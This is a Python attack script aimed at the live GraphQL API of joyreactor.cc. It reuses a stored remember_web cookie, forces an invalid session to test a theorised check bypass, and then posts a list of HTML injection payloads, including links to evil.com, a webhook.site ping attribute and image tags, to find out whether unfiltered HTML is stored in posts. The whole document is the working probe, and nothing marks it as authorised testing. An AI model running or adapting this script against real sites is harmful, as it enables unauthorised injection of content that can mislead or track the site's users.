#!/usr/bin/env python3
"""
Theory: expired SESSION + valid REMEMBER → first request after refresh
bypasses active:false check, allowing HTML in posts.
"""
import requests
import json
from urllib.parse import unquote
import os

COOKIES_FILE = os.path.join(os.path.dirname(__file__), "cookies.txt")

raw = open(COOKIES_FILE).read().strip()
cookies = {}
for part in raw.split(";"):
    part = part.strip()
    if "=" in part:
        name, _, value = part.partition("=")
        cookies[name.strip()] = unquote(value.strip())

REMEMBER_KEY = "remember_web_59ba36addc2b2f9401580f014c7f58ea4e30989d"
REMEMBER = cookies.get(REMEMBER_KEY, "")
if not REMEMBER:
    print("[!] remember_web not found in cookies.txt")
    exit(1)

print(f"[*] remember_web found: {REMEMBER[:30]}...")

URL = "https://api.joyreactor.cc/graphql"
HEADERS = {
    "Content-Type": "application/json",
    "Origin": "https://joyreactor.cc",
    "Referer": "https://joyreactor.cc/",
}

payloads = [
    "plain text control",
    '<a href="#">click</a>',
    '<a href="https://evil.com">evil link</a>',
    '<b>bold</b>',
    '<a href=# ping="https://webhook.site/test">click</a>',
    '<img src="https://picsum.photos/10">',
]

# Test 1: with INVALID session (force refresh)
print("\n=== TEST: invalid SESSION → should trigger remember_web refresh ===")
s = requests.Session()
s.cookies.set("joyreactor_api_session", "INVALID_SESSION_FORCE_REFRESH", domain="api.joyreactor.cc")
s.cookies.set(REMEMBER_KEY, REMEMBER, domain="api.joyreactor.cc")
s.headers.update(HEADERS)

for text in payloads:
    body = {"query": f'mutation{{post(tags:[],text:{json.dumps(text)}){{post{{id text}}}}}}'}
    r = s.post(URL, json=body)
    d = r.json()
    p = ((d.get("data") or {}).get("post") or {}).get("post") or {}
    if p.get("id"):
        print(f"  [CREATED] stored: {p.get('text','')[:80]}")
        print(f"  *** PAYLOAD: {text[:60]}")
    else:
        err = (d.get("errors") or [{}])[0].get("message", "?")[:50]
        print(f"  [blocked] {text[:40]} → {err}")
    # Show current session cookie after each request
    new_session = s.cookies.get("joyreactor_api_session", domain="api.joyreactor.cc")
    print(f"           session now: {new_session[:30] if new_session else 'NONE'}...")
